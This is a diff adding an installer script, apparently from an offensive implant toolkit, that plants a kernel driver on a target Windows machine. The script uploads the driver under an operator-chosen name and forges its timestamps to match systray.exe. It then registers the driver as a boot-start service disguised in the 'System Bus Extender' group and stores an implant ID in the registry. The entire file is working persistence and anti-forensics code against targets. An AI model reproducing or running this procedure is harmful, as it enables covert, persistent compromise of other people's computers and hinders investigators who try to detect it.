@@ -1,0 +1,185 @@
+#--------------------------------------------------------
+# File: Install.eps
+#
+# Install RP.
+#--------------------------------------------------------
+
+# *** NOTE *** NOTE *** NOTE *** NOTE *** NOTE *** NOTE ***
+#
+# For EP v3.0+ these two file names need leading underscores
+# In addition, the two calls "GetSystemVersion" and
+# "GetSystemPaths" (found below) need underscores.
+#
+# *** NOTE *** NOTE *** NOTE *** NOTE *** NOTE *** NOTE ***
+
+@include "GetSystemPaths.epm";
+@include "GetSystemVersion.epm";
+
+# This routine stolen from EP v3.0 (and renamed).
+# We need this to be v3.0 compatible. Once we
+# don't have to worry about pre-v3.0, we can
+# get rid of this and use the EP-supplied
+# _FileExists.epm file and _FileExists function.
+# (StrLen not available prior to v3.0)
+
+Sub myFileExists(IN STRING $file, IN STRING $path)
+{
+    @echo off;
+    @record on;
+    bool $ok;
+    $ok = `dir "$file" -path "$path"`;
+    
+    @record off;
+    ifnot($ok)
+    {    return false;    }
+
+    string $name = GetCmdData("name");
+    ifnot(defined($name))
+    {    return false;    }
+    if(sizeof($name) < 1)
+    {    return false;    }
+    
+    @echo on;
+    return true;
+
+}	/* end myFileExists (path) */
+
+@echo off;
+
+if ($argc != 3) {
+    echo "Usage: $argv[0] <driverName> <implantID>";
+    return false;
+}
+
+string $driver = $argv[1];
+string $id = $argv[2];
+
+# check to make sure we're NT 4 Sp4 or higher
+int $majorVersion;
+int $minorVersion;
+int $buildNumber;
+int $platformId;
+int $spMajorVersion;
+int $spMinorVersion;
+ifnot (GetSystemVersion($majorVersion, $minorVersion, $buildNumber, $platformId, $spMajorVersion, $spMinorVersion)) {
+    echo "Unable to get system version -- manually verify that";
+    echo "the target system is Windows NT Sp4 or greater";
+    pause;
+} else if (($majorVersion < 4) || (($majorVersion == 4) && ($spMajorVersion < 4))) {
+    # NT 4 Service pack 3 or less
+    echo "*** Target system is pre-NT Sp4. ***";
+    echo "    RP is not compatible with this system";
+    return false;
+}
+
+echo "Target OS: Windows NT $majorVersion.$minorVersion (build $buildNumber, platform $platformId, SP $spMajorVersion.$spMinorVersion)";
+
+# get the root directory
+string $system;
+string $root;
+ifnot (GetSystemPaths($system, $root)) {
+	echo "* Unable to determine system root";
+	return false;
+}
+# systemroot will be something like: C:\WINNT\system2
+string $systemroot = "$system\\$root";
+echo "System root: $systemroot";
+
+# give operator a chance to change her mind
+ifnot (prompt "Are you sure you want to install $driver?") {
+    return false;
+}
+
+# We need to be careful where we place the "@record" statements.
+# Prior to EP v3.0, there was a bug due to the fact that no
+# counter was associated with @record. Hence, a subroutine call
+# could turn @record off even though the caller wanted it on.
+# Hence, if we have "@record on" at the top of this script, it
+# would be turned off at this point (prior to v3.0) due to the
+# above subroutine calls.
+#
+# Hence, we place it here so that we can use GetCmdData on the
+# results of the getdirectory call.
+
+@record on;
+
+# get resource directory
+ifnot (`getdirectory -scripts`) {
+	echo "* Unable to get scripts directory";
+	return false;
+}
+
+string $ScriptsDir = GetCmdData("dir");
+ifnot (defined($ScriptsDir[0])) {
+	echo "* Unable to retrieve scripts directory";
+	return false;
+}
+
+string $resPath = "$ScriptsDir\\..\\..\\RP";
+
+@record off;
+
+# make sure it's not already installed
+if (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$driver`) {
+    echo "$driver is already installed (key exists)";
+    return false;
+}
+
+# As of EP v3.0, if a file doesn't exist, dir will succeed,
+# but there won't be any command data. Hence, we have to
+# check for command data if dir succeeds.
+# [Once we know we don't have to worry about pre-EP v3.0,
+#  we can just include _FileExists.epm and call _FileExists.]
+
+if (myFileExists("$driver.sys", "$systemroot\\drivers")) {
+    echo "$driver is already installed (file exists)";
+    return false;
+}
+
+#---------------------------
+# Driver not installed
+#---------------------------
+
+# put the driver
+echo "Uploading:";
+echo " src: $resPath\\ntapicti.sys";
+echo " dst: $systemroot\\drivers\\$driver.sys";
+if (`put "$resPath\\ntapicti.sys" -name "$systemroot\\drivers\\$driver.sys" -permanent`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+# match file times for driver
+echo "Matching file time for SYS";
+if (`matchtimes "$systemroot\\systray.exe" "$systemroot\\drivers\\$driver.sys"`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED (but continuing anyway)";
+}
+
+# add the registry keys
+bool $keysAdded = true;
+echo "Adding registry keys";
+ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value ErrorControl -type REG_DWORD -data 0`) {
+    $keysAdded = false;
+} else ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value Start -type REG_DWORD -data 0`) {
+    $keysAdded = false;
+} else ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value Type -type REG_DWORD -data 1`) {
+    $keysAdded = false;
+} else ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value Group -type REG_SZ -data "System Bus Extender"`) {
+    $keysAdded = false;
+} else ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value v1 -type REG_DWORD -data $argv[2]`) {
+    $keysAdded = false;
+}
+
+if ($keysAdded == false) {
+    echo "    FAILED";
+    return false;
+} else {
+    echo "    SUCCESS";
+}
+
+# we're done...
+return true;
